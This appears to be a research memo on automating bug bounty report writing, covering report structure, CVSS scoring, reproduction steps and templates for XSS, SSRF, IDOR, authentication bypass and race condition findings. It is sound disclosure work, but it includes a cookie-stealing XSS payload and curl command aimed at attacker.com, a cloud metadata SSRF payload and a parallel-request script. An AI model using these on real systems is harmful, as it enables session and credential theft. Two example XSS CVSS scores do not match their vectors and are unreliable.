# R5.2 - Automated Vulnerability Report Generation for Bug Bounty Platforms

**Research Date:** 2026-03-25
**Scope:** HackerOne report anatomy, CVSS automation, reproduction step generation, triager psychology, per-class templates, impact statements
**Purpose:** Inform Project Triage autonomous report generation module

---

## 1. HackerOne Report Anatomy - What Triagers Actually Need

### 1.1 The Triager's Mental Model

Triagers work under queue pressure - dozens to hundreds of submissions at once. They do not read reports linearly. They skim, identify signal, and make a triage decision in under 30 seconds. A report that forces work onto the triager gets delayed or closed. The three questions a report must answer instantly:

1. What is the vulnerability?
2. Why does it matter?
3. Can I reproduce it right now?

Every section in a well-structured report serves one of these three questions. If a section does not answer any of them, it should be removed.

### 1.2 Required Sections (Non-Negotiable)

Based on HackerOne's own quality documentation and triager accounts:

**Title**
- Must convey vulnerability type, location, and impact in one sentence
- 140 characters or fewer
- Bad: "XSS Bug Found"
- Good: "Stored XSS in user profile display name executes arbitrary JS for all visitors"
- The title is the first thing in the queue view - it determines if the triager opens the report with urgency or boredom

**Summary / Description**
- 2-3 sentences maximum
- State what is broken, where it is broken, and what an attacker gains
- The triager should be able to grasp the entire issue from this block without reading anything else
- Do not pad with background information about XSS in general, how SQL injection works, etc.

**Steps to Reproduce (most critical section)**
- Numbered list, each step a single atomic action
- Write as if the triager has never visited the target, even if they built it
- Include: exact URLs, parameter names, header values, payload strings, account roles required
- Include login/logout transitions explicitly ("Log in as User A", "Log out", "Log in as User B")
- Include what to observe at each step ("Observe that the response contains the value of /etc/passwd")
- Missing or broken reproduction steps are the single most common reason for NMI (Needs More Information) status

**Proof of Concept**
- Raw HTTP request/response pairs as text (not screenshots of Burp)
- Screenshots showing the impact visually
- Short video (under 2 minutes, ideally under 30 seconds) for complex multi-step flows
- The PoC must be self-contained and reproducible - tool output dumps without explanation are explicitly rejected by programs

**Impact Statement**
- Describe the worst-case exploitation scenario in concrete terms
- Do not write "this could lead to XSS" - write "an unauthenticated attacker can execute JavaScript in the context of any authenticated user's session, enabling account takeover via cookie theft or credential harvesting via DOM manipulation"
- Map to business impact: data exposure, authentication bypass, financial manipulation, compliance violation
- Include the CVSS vector string and explain your metric choices

**Expected vs Actual Behavior**
- Two-line comparison: what the application should do vs what it actually does
- Forces clarity on the security contract that is being violated

**Supporting Materials**
- Screenshots attached inline, not as links to external services
- HTTP request/response logs
- Payload files if applicable

### 1.3 What Gets Reports NA'd or Rejected

From HackerOne documentation and disclosed report analysis:

- **Out of scope** - asset not in scope definition, vulnerability type excluded
- **Duplicate** - already reported (check for similar titles before submitting)
- **Informational** - no exploitable impact demonstrated
- **Missing reproduction steps** - triager cannot verify the issue
- **Tool output without analysis** - automated scanner dumps with no manual validation
- **Inflated severity** - CVSS vector inconsistent with described behavior
- **Multiple bugs in one report** - one invalid issue can sink the whole submission
- **Theoretical attacks** - the phrase "an attacker could potentially" without actual demonstration
- **Self-XSS** - requires the victim to paste payload themselves, not exploitable
- **No authentication context** - report does not state what access level was used

### 1.4 Report States

Understanding the state machine helps automate follow-up logic:

- **New** - submitted, not yet triaged
- **Triaged** - validated as genuine, being assessed for severity
- **Needs More Info (NMI)** - triager cannot reproduce or needs clarification
- **Resolved** - fixed by program
- **Informational** - valid observation but no exploitable impact
- **N/A** - not applicable: out of scope, duplicate, or non-qualifying
- **Duplicate** - previously known issue

For an autonomous agent, NMI is the most important failure mode to prevent. Every NMI is a report that could have been bounty-worthy but was blocked by missing information.

---

## 2. CVSS 3.1 Scoring Automation

### 2.1 CVSS Vector Components for Automation

CVSS 3.1 Base Score is computed from eight metrics. An autonomous agent can map vulnerability metadata to metric values using a decision tree:

**Attack Vector (AV)**
- `N` (Network) - exploitable remotely over the internet. Applies to all web vulns (XSS, SSRF, SQLi, IDOR, auth bypass)
- `A` (Adjacent) - requires local network access
- `L` (Local) - requires local system access
- `P` (Physical) - requires physical access

**Attack Complexity (AC)**
- `L` (Low) - no special conditions, repeatable at will
- `H` (High) - requires specific race condition, MitM position, or non-default configuration

**Privileges Required (PR)**
- `N` (None) - unauthenticated
- `L` (Low) - any authenticated user
- `H` (High) - admin or privileged role required

**User Interaction (UI)**
- `N` (None) - no victim action needed (SSRF, SQLi, IDOR)
- `R` (Required) - victim must click a link or view content (reflected XSS, CSRF)

**Scope (S)**
- `U` (Unchanged) - impact confined to the vulnerable component
- `C` (Changed) - vulnerability affects resources beyond the vulnerable component (stored XSS affecting other users, SSRF reaching internal services)

**Confidentiality (C), Integrity (I), Availability (A)**
- `N` (None) - no impact on this dimension
- `L` (Low) - limited access or minor modification
- `H` (High) - complete access, full modification, or complete loss of service

### 2.2 Automated Metric Mapping by Vulnerability Class

```
XSS (Reflected):
  AV:N / AC:L / PR:N / UI:R / S:U / C:L / I:L / A:N
  Base Score: ~6.1 (Medium)
  Upgrade to S:C if it affects other user sessions

XSS (Stored):
  AV:N / AC:L / PR:L / UI:R / S:C / C:L / I:L / A:N
  Base Score: ~5.4 (Medium)
  Upgrade PR to N if stored location is publicly accessible

XSS (DOM - no server interaction):
  AV:N / AC:L / PR:N / UI:R / S:U / C:L / I:L / A:N
  Base Score: ~6.1 (Medium)

SSRF (Internal network access):
  AV:N / AC:L / PR:L / UI:N / S:C / C:H / I:L / A:N
  Base Score: ~8.5 (High)
  Upgrade to Critical if cloud metadata (AWS IMDSv1) accessible

SSRF (Blind, no response):
  AV:N / AC:L / PR:L / UI:N / S:U / C:N / I:L / A:N
  Base Score: ~4.3 (Medium)

IDOR (read other user data):
  AV:N / AC:L / PR:L / UI:N / S:U / C:H / I:N / A:N
  Base Score: ~6.5 (Medium)

IDOR (write/modify other user data):
  AV:N / AC:L / PR:L / UI:N / S:U / C:H / I:H / A:N
  Base Score: ~8.1 (High)

SQLi (read-only, no auth bypass):
  AV:N / AC:L / PR:N / UI:N / S:U / C:H / I:N / A:N
  Base Score: ~7.5 (High)

SQLi (write or auth bypass):
  AV:N / AC:L / PR:N / UI:N / S:U / C:H / I:H / A:N
  Base Score: ~9.1 (Critical)

Auth Bypass (any user becomes admin):
  AV:N / AC:L / PR:N / UI:N / S:U / C:H / I:H / A:H
  Base Score: ~9.8 (Critical)

Race Condition (financial - double spend):
  AV:N / AC:H / UI:N / PR:L / S:U / C:N / I:H / A:N
  Base Score: ~5.3 (Medium) - AC:H for timing requirement

Race Condition (account state manipulation):
  AV:N / AC:H / UI:N / PR:L / S:U / C:L / I:H / A:N
  Base Score: ~5.9 (Medium)
```

### 2.3 Python Libraries for CVSS Automation

The `cvss` package from Red Hat (PyPI: `cvss`) is the most complete option:

```python
from cvss import CVSS3

# Construct from vector string
c = CVSS3("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N")
base, temporal, environmental = c.scores()
severity_label = c.severities()[0]  # "Medium", "High", "Critical"
vector_string = c.clean_vector()

# Build programmatically from metric dict
def build_cvss_vector(av="N", ac="L", pr="N", ui="N", s="U", c="H", i="H", a="H"):
    vector = f"CVSS:3.1/AV:{av}/AC:{ac}/PR:{pr}/UI:{ui}/S:{s}/C:{c}/I:{i}/A:{a}"
    score_obj = CVSS3(vector)
    base_score, _, _ = score_obj.scores()
    severity = score_obj.severities()[0]
    return {
        "vector": vector,
        "base_score": float(base_score),
        "severity": severity
    }
```

The `cvsslib` package (PyPI: `cvsslib`) offers similar capability with an extensible architecture. Both packages support CVSS v3.1 and v4.0.

### 2.4 Severity vs Payout Disconnect

CVSS score is not payout. Programs use CVSS as a starting point but adjust based on:
- Exploitability in practice (WAF blocking? Requires chaining?)
- Data sensitivity of affected records
- Number of users affected
- Business criticality of the endpoint

The autonomous agent should report CVSS accurately and then separately articulate business impact in plain language to justify the severity label regardless of numerical score.

---

## 3. Reproduction Step Generation from Tool Traces

### 3.1 The Core Problem

Raw tool output - Burp request dumps, nuclei output, ffuf logs - is explicitly flagged by programs as insufficient. Submissions containing only automated tool output are marked invalid. The agent must transform execution traces into human-readable, followable steps.

### 3.2 Step Generation Principles

**Trace-to-Step Mapping:**

Each HTTP exchange in a tool trace maps to:
1. A setup step (state before the request)
2. An action step (the request itself, in human terms)
3. An observation step (what the response reveals)

Example transformation:
```
Raw trace:
  GET /api/v1/users/4729/profile HTTP/1.1
  Host: target.com
  Authorization: Bearer eyJ...

  HTTP/1.1 200 OK
  {"id":4729,"email":"victim@target.com","ssn":"123-45-6789"}

Generated step:
  1. Log in as any standard user account (e.g., attacker@example.com)
  2. Note your own user ID from the profile page (e.g., /api/v1/users/1234/profile)
  3. Modify the user ID in the URL to another user's ID (e.g., 4729)
     Request: GET /api/v1/users/4729/profile HTTP/1.1
  4. Observe that the response returns the victim's email and SSN without authorization error
     Response excerpt: {"email":"victim@target.com","ssn":"123-45-6789"}
```

**Key generation rules:**
- Number every step
- Make setup state explicit (which account, which browser, logged in or not)
- Write actions as imperative sentences ("Navigate to", "Modify", "Observe")
- Quote exact payload strings in code blocks
- Include expected negative outcome that does not occur ("Observe that no 403 Forbidden is returned")
- Include positive outcome that demonstrates impact ("Observe that the response contains PII belonging to a different user")

### 3.3 Evidence Attachment Logic

For each vulnerability class, the reproduction section should include:

**XSS:** Screenshot of alert/payload executing, DOM view showing injected code, request with payload, response showing reflection without encoding

**SSRF:** HTTP request triggering the outbound connection, response showing internal IP/hostname resolution or cloud metadata content, OOB interaction log from collaborator/interactsh if blind

**IDOR:** Two account sessions side-by-side, request using account A's token with account B's resource ID, response showing B's data, comparison proving the data is not A's

**Auth bypass:** Request without valid credentials, response showing 200 with protected content, annotated to show which header/parameter was manipulated

**Race condition:** Turbo Intruder or similar parallel request setup, multiple response codes/timestamps proving simultaneous processing, final state showing duplicated action (double credit, double entry)

**SQLi:** Request with payload, response showing data extraction or error leakage, if time-based: annotated timing comparison between true/false conditions

### 3.4 PoC Code Format Standards

HTTP requests must be submitted as raw text, not screenshots. Standard format:

```
POST /api/v2/comments HTTP/1.1
Host: target.example.com
Content-Type: application/json
Authorization: Bearer <your_token>

{"body":"<script>fetch('https://attacker.com/?c='+document.cookie)</script>"}
```

Curl equivalents are acceptable as supplementary evidence:
```bash
curl -s -X POST 'https://target.example.com/api/v2/comments' \
  -H 'Authorization: Bearer YOUR_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"body":"<script>fetch(\"https://attacker.com/?c=\"+document.cookie)</script>"}'
```

---

## 4. Report Psychology - What Triagers Actually Prioritize

### 4.1 The Queue Reality

A triager at a busy program handles 50-200 submissions per week. Each report competes for attention. Reports that reduce triager cognitive load get prioritized. Reports that create work get deprioritized or rejected.

### 4.2 Psychological Triggers for Prioritization

**Trust signals that elevate a report:**
- Professional title that matches what actually happens (trust established immediately)
- Reproduction steps that actually work first try (credibility established)
- CVSS vector that is defensible (shows researcher understands severity honestly)
- Concise, structured prose (shows researcher respects triager's time)
- Prior successful submissions on the program (reputation carries forward)
- Remediation suggestion with code-level detail (shows deep understanding)

**Trust killers that kill reports:**
- Overclaimed severity with weak justification ("this is Critical because attackers could do anything")
- Reproduction steps that fail or are ambiguous
- External links for evidence (Dropbox, Google Drive, Imgur) instead of inline attachments
- Walls of text with no formatting
- Scanner output copy-pasted without analysis
- Multiple unrelated bugs bundled together
- Emotional language when responding to triage decisions

### 4.3 Title Engineering

The title is the most important field for first impression. Pattern:

`[VulnType] in [Component/Endpoint] allows [Attacker] to [Impact]`

Examples:
- "Stored XSS in support ticket subject field allows unauthenticated script execution for all support staff"
- "IDOR in invoice download endpoint exposes financial records of arbitrary customers"
- "SSRF via webhook URL parameter reaches internal AWS metadata service"
- "Authentication bypass in password reset flow allows account takeover without email access"
- "Race condition in subscription upgrade allows permanent premium access with single payment"

### 4.4 Summary Paragraph Formula

Three sentences:
1. What the vulnerability is and where it lives
2. What security boundary is violated
3. What an attacker achieves

Example for IDOR:
"The /api/v2/documents/{id}/download endpoint does not validate that the requesting user owns the document referenced by the `id` path parameter. Any authenticated user can substitute an arbitrary document ID to download files belonging to other users. An attacker with a free account can enumerate all document IDs and exfiltrate the entire document library."

### 4.5 Language That Works

**Use:**
- Active voice: "An attacker can read" not "user data may be exposed"
- Concrete nouns: "PII including email, phone, and SSN" not "sensitive information"
- Precise verbs: "bypasses", "overwrites", "exfiltrates", "escalates"
- Conditional attacks framed as present capability: "An attacker with a free account can..."
- Quantified impact where possible: "All 2.3M user records", "Any invoice in the system"

**Avoid:**
- Hedging: "could potentially", "might be possible", "may allow"
- Jargon without explanation: assume triager knows web security but not your specific finding's nuances
- Boilerplate sentences that appear in every report (triagers recognize and skim them)
- Padding: do not explain what XSS is in a report about XSS

---

## 5. Vulnerability-Class Templates

### 5.1 XSS Template

```markdown
## Title
[Stored/Reflected/DOM] XSS in [parameter/field] on [page/endpoint] executes arbitrary JavaScript in [victim context]

## Summary
The `[parameter]` field on `[URL]` does not sanitize HTML entities before rendering user-supplied input in the DOM. An attacker can inject a script payload that executes in the browser context of [victims who view the page / any user who follows a crafted link]. This enables session hijacking, credential harvesting, or arbitrary actions performed on behalf of the victim.

## Severity
CVSS 3.1: [vector string] - [score] ([label])

## Steps to Reproduce
1. Log in as [role] at [URL]
2. Navigate to [specific page]
3. In the [field name] field, enter the following payload:
   ```
   [payload]
   ```
4. [Submit/Save/Send]
5. [Navigate to the page where the payload renders / Send the crafted URL to a victim]
6. Observe that the payload executes - [alert box appears / network request fires / cookie is exfiltrated]

## Proof of Concept
**Request:**
```http
POST /path/to/endpoint HTTP/1.1
Host: target.com
[headers]

[body with payload]
```

**Screenshot:** [inline image showing execution]

## Impact
An attacker can steal authenticated session cookies, perform actions as the victim, or redirect victims to a phishing page. [If stored: all users who view [the affected page] are affected.] [Estimated user population: X.]

## Remediation
Encode all user-supplied input before rendering in HTML context using context-appropriate encoding (HTML entity encoding for HTML context, JavaScript escaping for JS context). Implement a Content Security Policy that blocks inline scripts.
```

### 5.2 SSRF Template

```markdown
## Title
SSRF via [parameter] on [endpoint] allows [internal network access / cloud metadata retrieval / port scanning]

## Summary
The `[parameter]` parameter on `[endpoint]` accepts a URL that the server fetches without validation. An attacker can supply internal IP addresses, cloud metadata service endpoints, or arbitrary hostnames. [Evidence of internal access: what was retrieved.]

## Severity
CVSS 3.1: [vector string] - [score] ([label])

## Steps to Reproduce
1. Log in as [role] at [URL]
2. Navigate to [feature that uses the URL parameter]
3. Intercept the request in Burp Suite
4. Modify the `[parameter]` value to:
   ```
   http://169.254.169.254/latest/meta-data/iam/security-credentials/
   ```
   (or internal host: `http://10.0.0.1/admin`)
5. Forward the request
6. Observe that the response body contains [IAM credentials / internal service response / port scan result]

## Proof of Concept
**Request:**
```http
POST /api/webhooks HTTP/1.1
Host: target.com
[headers]

{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

**Response excerpt showing internal data:**
```
[trimmed response showing internal content]
```

## Impact
[Full SSRF:] An attacker can read cloud IAM credentials, enabling full AWS/GCP/Azure account takeover. Internal services behind the firewall are reachable, including databases, admin panels, and message queues.
[Blind SSRF:] An attacker can map the internal network topology, trigger outbound connections from the server's IP (useful for firewall bypass), and potentially reach services that trust the server's IP.

## Remediation
Validate URLs against an allowlist of permitted hostnames. Block RFC 1918 address space, link-local addresses (169.254.x.x), and loopback. Use a dedicated egress proxy that enforces the allowlist.
```

### 5.3 IDOR Template

```markdown
## Title
IDOR in [endpoint] allows [role] to [access/modify/delete] [resource type] belonging to arbitrary [users/organizations]

## Summary
The `[endpoint]` endpoint uses a predictable/sequential/UUID identifier in the [path/query/body] to reference [resource]. The server does not verify that the requesting user is authorized to access the referenced resource. Any authenticated user can substitute an arbitrary ID to [read/modify/delete] another user's [resource].

## Severity
CVSS 3.1: [vector string] - [score] ([label])

## Steps to Reproduce
**Setup:**
- Account A (attacker): [attacker@example.com]
- Account B (victim): [victim@example.com]

**Steps:**
1. Log in as Account A
2. Navigate to [resource page] and note your own resource ID: `[your_id]`
3. Send the following request, replacing the ID with Account B's ID:
   ```http
   GET /api/v1/[resource]/[victim_id] HTTP/1.1
   Host: target.com
   Authorization: Bearer [Account_A_token]
   ```
4. Observe the response returns Account B's [resource data] with HTTP 200 (no authorization error)

## Proof of Concept
**Request (Account A accessing Account B's data):**
```http
GET /api/v1/invoices/84729 HTTP/1.1
Host: target.com
Authorization: Bearer eyJ...Account_A_token...
```

**Response:**
```json
{"id":84729,"owner_email":"victim@example.com","amount":1200.00,...}
```

**Screenshot:** [side-by-side showing two accounts, Account A accessing B's data]

## Impact
Any authenticated user can read/modify/delete [resources] belonging to other users. [Quantify: with sequential IDs, an attacker can enumerate all records from ID 1 to current maximum, exfiltrating [data type] for all [X] users in the system.]

## Remediation
Implement object-level authorization checks that verify the requesting user's ownership of the referenced resource before processing the request. Use opaque, non-sequential identifiers (UUIDs) to prevent enumeration, but do not rely on ID opacity as the sole authorization control.
```

### 5.4 Authentication Bypass Template

```markdown
## Title
Authentication bypass in [flow/endpoint] allows [unauthenticated access to / privilege escalation to] [protected functionality]

## Summary
The [password reset / login / session validation / JWT verification] flow at [endpoint] contains a logic flaw that allows an attacker to [bypass the authentication requirement / escalate to admin]. [Brief description of the broken logic - e.g., the server accepts JWTs signed with the "none" algorithm, the password reset token is not validated server-side, the admin check is performed client-side only.]

## Severity
CVSS 3.1: [vector string] - [score] ([label])

## Steps to Reproduce
1. [Specific sequence of requests or UI actions]
2. [Highlight the exact manipulation - what value is changed, deleted, or forged]
3. [Show the result - what protected resource is now accessible]

## Proof of Concept
```http
[Request showing the bypass]
```
```http
[Response showing unauthorized access granted]
```

## Impact
An unauthenticated attacker [or: a user with [low] privilege] can [access admin functions / take over arbitrary accounts / read all user data]. This represents a complete authentication failure for the [affected flow].

## Remediation
[Specific fix for the logic flaw found]
```

### 5.5 Race Condition Template

```markdown
## Title
Race condition in [endpoint/operation] allows [double spend / duplicate action / state corruption]

## Summary
The [subscription upgrade / coupon redemption / fund transfer / vote submission] endpoint at [URL] does not implement locking or idempotency controls. By sending multiple simultaneous requests, an attacker can cause the operation to execute [N] times while only being charged/consuming the resource once.

## Severity
CVSS 3.1: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N - [score] (Medium/High)
Note: AC:H reflects the timing requirement for exploitation.

## Steps to Reproduce
**Tools required:** Burp Suite with Turbo Intruder extension (or any parallel HTTP sender)

1. Log in as a test account
2. Initiate [the action] and intercept the request in Burp Suite
3. Send the request to Turbo Intruder
4. Configure Turbo Intruder to send [N=20] parallel copies of the request simultaneously
   ```python
   # Turbo Intruder script
   def queueRequests(target, wordlists):
       engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=20)
       for i in range(20):
           engine.queue(target.req)
       engine.start(timeout=10)
   ```
5. Execute the attack
6. Observe that [N] responses return HTTP 200 (success) instead of the expected [N-1] errors
7. Check account state: observe that [the credit was applied N times / the coupon was redeemed N times / the action was recorded N times]

## Proof of Concept
**[N] simultaneous requests all returning 200:**
[Screenshot of Turbo Intruder results showing multiple successes]

**Account state before:** [screenshot]
**Account state after:** [screenshot showing duplicated outcome]

## Impact
An attacker can [receive premium service for free / redeem a single-use coupon multiple times / transfer funds multiple times from a single balance]. [Quantify potential loss: a single coupon code worth $X can be redeemed Y times with 20 parallel requests, yielding $X*Y in fraudulent value.]

## Remediation
Implement database-level locking (SELECT FOR UPDATE) or atomic operations for the affected resource. Add idempotency keys to the API so duplicate requests within a time window are rejected. Validate resource state before and after the operation within a single transaction.
```

---

## 6. Impact Statement Construction

### 6.1 The Impact Statement Formula

Impact statements that justify severity ratings follow a consistent structure:

```
[Attacker profile] can [specific action] which results in [concrete harm]
affecting [scope of victims] [with quantification where possible].
```

### 6.2 Impact Tiers by Vulnerability

**Critical impact language (supports Critical/High CVSS):**
- "An unauthenticated attacker can extract the complete database of user credentials"
- "Any authenticated user can assume administrative privileges and control all tenant data"
- "An attacker can steal valid session tokens for any currently logged-in user, enabling immediate account takeover without credentials"
- "An attacker can retrieve AWS IAM access keys granting full access to the underlying cloud infrastructure"

**High impact language:**
- "An authenticated attacker can read the personal data (email, address, payment method last four) of any of the platform's [N] users"
- "An attacker can permanently delete any user's account and all associated data"
- "An attacker can modify another user's profile information, including email address, effectively locking them out of their account"

**Medium impact language:**
- "An attacker can read metadata (but not content) of files belonging to other users, enabling targeted social engineering"
- "An attacker can cause the application to make outbound connections to arbitrary hosts, usable for internal network probing"
- "An attacker can inject malicious JavaScript that executes when the target user visits their own profile page"

### 6.3 Business Impact Framing

Technical impact alone is not sufficient for convincing severity justification. Map to business consequences:

- **Regulatory/compliance:** "Exposure of EU resident PII violates GDPR Article 5 data minimization and may trigger mandatory breach notification under Article 33"
- **Financial:** "An attacker exploiting the race condition on subscription upgrades could obtain $[X]/month premium service indefinitely at zero cost"
- **Reputational:** "Stored XSS on the main dashboard executes for all users, enabling a mass credential phishing campaign that would be attributed to [company] infrastructure"
- **Operational:** "An attacker can delete arbitrary S3 objects through the SSRF, causing data loss for all customers"

### 6.4 Calibrating Impact to Avoid Inflation

Inflated impact claims are a primary reason triagers downgrade severity or reject reports outright. Rules for calibration:

- Only claim impacts that your PoC actually demonstrates
- If your PoC shows read access to one user's data, do not claim "complete database dump" unless you also demonstrated enumeration
- If your SSRF reaches the metadata service but returns empty on sensitive endpoints, acknowledge it as partial impact
- If the XSS is self-XSS or requires a very specific victim action, note the reduced exploitability
- Programs will accept an honest Medium over a fraudulent Critical every time

---

## 7. Automation Architecture for Report Generation

### 7.1 Agent Input Requirements

For the autonomous agent to generate a complete report, it needs these inputs from the exploitation phase:

```python
@dataclass
class FindingMetadata:
    vuln_class: str          # "XSS", "SSRF", "IDOR", "SQLi", "auth_bypass", "race"
    subtype: str             # "stored", "reflected", "dom" for XSS; "blind", "full" for SSRF
    endpoint: str            # full URL
    parameter: str           # parameter name
    payload: str             # exact payload used
    method: str              # HTTP method
    auth_required: bool      # was auth required
    auth_level: str          # "none", "user", "admin"
    user_interaction: bool   # does exploit require victim action
    scope_change: bool       # does exploit affect other users/components
    evidence_requests: list  # raw HTTP request strings
    evidence_responses: list # raw HTTP response strings
    evidence_screenshots: list # file paths
    poc_verified: bool       # was exploitation actually confirmed
    data_exposed: list       # types of data accessed
    affected_users: str      # estimate: "single", "any_authenticated", "all_users"
```

### 7.2 Report Generation Pipeline

```
FindingMetadata
    -> select_template(vuln_class, subtype)
    -> compute_cvss(vuln_class, subtype, auth_required, user_interaction, scope_change, data_exposed)
    -> generate_title(vuln_class, endpoint, parameter, data_exposed, affected_users)
    -> generate_summary(vuln_class, endpoint, parameter, broken_security_property)
    -> generate_steps(evidence_requests, evidence_responses, auth_required, payload)
    -> format_poc(evidence_requests, evidence_responses, payload)
    -> generate_impact(vuln_class, data_exposed, affected_users, auth_level)
    -> generate_remediation(vuln_class)
    -> assemble_markdown(all_sections)
    -> validate_completeness(report) -> flag missing sections
    -> output_report(report, path)
```

### 7.3 Quality Gate Before Submission

Before any report is submitted, the agent must verify:

1. `poc_verified == True` - the exploitation was actually confirmed, not theoretical
2. All required sections are present (title, summary, steps, PoC, impact)
3. Reproduction steps are numbered and contain explicit observations
4. CVSS vector is consistent with finding metadata
5. Impact claim matches what was demonstrated in the PoC
6. No external links for evidence - all screenshots are local attachments
7. Single vulnerability per report (split multi-bug findings)
8. Target URL is in scope per the program's policy

---

## 8. Key Takeaways for Implementation

1. **Title is the highest-ROI field.** A well-engineered title gets the report opened with urgency. Use the formula: `[VulnType] in [Component] allows [Attacker] to [Impact]`

2. **Steps to Reproduce is the make-or-break section.** Missing, ambiguous, or broken reproduction steps are the top cause of NMI status. Generate them from actual HTTP traces, not from theoretical descriptions.

3. **CVSS can be fully automated** from vulnerability metadata using a decision tree mapped to the eight base metrics. Use the Red Hat `cvss` Python library for computation. The vector string goes in the report alongside a plain-language explanation.

4. **Impact statements must be concrete and calibrated.** Claim only what was demonstrated. Use the formula: `[Attacker profile] + [specific action] + [concrete harm] + [scope/quantification]`. Map to business consequences (regulatory, financial, reputational, operational).

5. **Triagers skim - structure is not optional.** Use markdown headers, numbered steps, code blocks for payloads, and inline screenshots. Every second spent decoding poorly formatted text is time working against acceptance.

6. **One bug per report.** Mixed reports risk partial rejection sinking the valid finding.

7. **The three triager questions drive all design decisions:** What is it? Why does it matter? Can I reproduce it right now? Every sentence in the report should answer one of these three questions or be removed.

---

## Sources

- [Quality Reports - HackerOne Help Center](https://docs.hackerone.com/en/articles/8475116-quality-reports)
- [Report States - HackerOne Help Center](https://docs.hackerone.com/en/articles/8475030-report-states)
- [There and Hack Again: A Triager's View On Quality Reports](https://h1.community/blog/there-amp-hack-again-a-triagers-view-on-quality-reports/)
- [HackerOne Triage 101](https://www.hackerone.com/sites/default/files/2025-02/HackerOne-Triage-101.pdf)
- [How to Write a Good Bug Bounty Report - Intigriti](https://www.intigriti.com/researchers/hackademy/how-to-write-a-good-report)
- [8 Tips for Writing Effective Bug Bounty Reports - Intigriti](https://www.intigriti.com/researchers/blog/hacking-tools/writing-effective-bug-bounty-reports)
- [How to Write an Effective Bug Bounty Report - YesWeHack](https://www.yeswehack.com/learn-bug-bounty/write-effective-bug-bounty-reports)
- [Why Bug Bounty Reports Get Rejected](https://www.comolho.com/post/why-bug-bounty-reports-get-rejected)
- [How to Write a Good Report and Use the CVSS Calculator - Hacker101](https://www.hacker101.com/resources/articles/writing_a_report_and_cvss.html)
- [Severity - HackerOne Help Center](https://docs.hackerone.com/en/articles/8495674-severity)
- [The Bug Bounty Report Blueprint Triagers Don't Ignore](https://amrelsagaei.com/the-bug-bounty-report-blueprint-triagers-dont-ignore)
- [The Art of Bug Bounty Triage and Impactful Reporting - BugBase](https://bugbase.ai/blog/the-art-of-bug-bounty-triage-and-impactful-reporting)
- [cvss - Red Hat Python Package (PyPI)](https://pypi.org/project/cvss/)
- [cvsslib - Python Package (PyPI)](https://pypi.org/project/cvsslib/)
- [CVSS 3.1 User Guide - FIRST](https://www.first.org/cvss/v3-1/user-guide)
- [Bug Bounty Report Templates - ZephrFish/BugBountyTemplates](https://github.com/ZephrFish/BugBountyTemplates)
- [Ultimate Guide to Race Condition Vulnerabilities - YesWeHack](https://www.yeswehack.com/learn-bug-bounty/ultimate-guide-race-condition-vulnerabilities)
- [GitLab CVSS Calculator](https://gitlab-com.gitlab.io/gl-security/product-security/appsec/cvss-calculator/)
